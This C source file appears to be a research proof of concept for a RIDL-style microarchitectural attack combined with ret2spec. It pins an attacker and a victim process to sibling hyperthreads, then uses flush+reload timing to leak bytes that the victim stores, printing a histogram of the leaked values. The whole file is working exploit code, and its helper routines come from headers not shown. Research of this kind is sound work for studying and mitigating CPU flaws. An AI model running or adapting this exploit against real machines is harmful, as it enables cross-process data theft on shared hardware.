#define _GNU_SOURCE
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <signal.h>
#include <sched.h>

#include "asm.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "find_threshold.h"
#include "ret2spec.h"

pid_t spawn_child() {
  // Define where to run the RIDL code and where to run the
  // victim code (different hyperthreads, same physical core)
  int parent_cpu = 1;
  int victim_cpu = 3;

  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(parent_cpu, &cpu_set);
  int affinity = sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set); 
  assert(!affinity);

  pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"movq %0, (%%rsp)\n"
				"mfence\n"
				::"r"(0xe8e7e6e5e4e3e2e1ull));
	}
	if (pid < 0) {
    fprintf(stderr, "Failed to spawn child process\n");
    exit(1);
  };

  CPU_ZERO(&cpu_set);
  CPU_SET(victim_cpu, &cpu_set);
  affinity = sched_setaffinity(pid, sizeof(cpu_set_t), &cpu_set); 
  assert(!affinity);
  return pid;
}

struct buffers {
  void *leak;
  void *reload;
};

struct buffers create_buffers() {
  struct buffers buffers = {0};

  buffers.leak = mmap(NULL,
                      PAGE_SIZE,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS,
                      -1,
                      0);
  assert(buffers.leak != MAP_FAILED);

  // Where we will measure the cache times
  const size_t reload_size = PAGE_SIZE * VALUES_IN_BYTE;
  buffers.reload = mmap(NULL,
                        reload_size,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                        -1,
                        0);
  assert(buffers.reload != MAP_FAILED);
  return buffers;
}

int main() {
  pid_t child_pid = spawn_child();

  struct buffers buffers = create_buffers();

  size_t results[VALUES_IN_BYTE] = {0};

  // Determine a threshold for when a cache is hot or cold
  // size_t threshold = find_in_cache_threshold();
  size_t threshold = 150;
  assert(threshold > 0);

  *(char*)buffers.leak = 0xAA;
  printf("buffers.leak is at %p\n", buffers.leak);
  printf("sudo ./pagemap %d %p %p\n", getpid(), (char*)buffers.leak - 1*PAGE_SIZE, (char*)buffers.leak + 1*PAGE_SIZE);

  for (int i = 0; i < 10000; ++i) {
    flush(VALUES_IN_BYTE, PAGE_SIZE, buffers.reload);
    ret2spec(buffers.leak, buffers.reload);
    reload(VALUES_IN_BYTE, PAGE_SIZE, buffers.reload, results, threshold);
  }

  printf("Results:\n");
  for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
    if (results[i] > 0) {
      printf("0x%lx\t%ld\n", i, results[i]);
    }
  }

  kill(child_pid, 9);

  return 0;
}
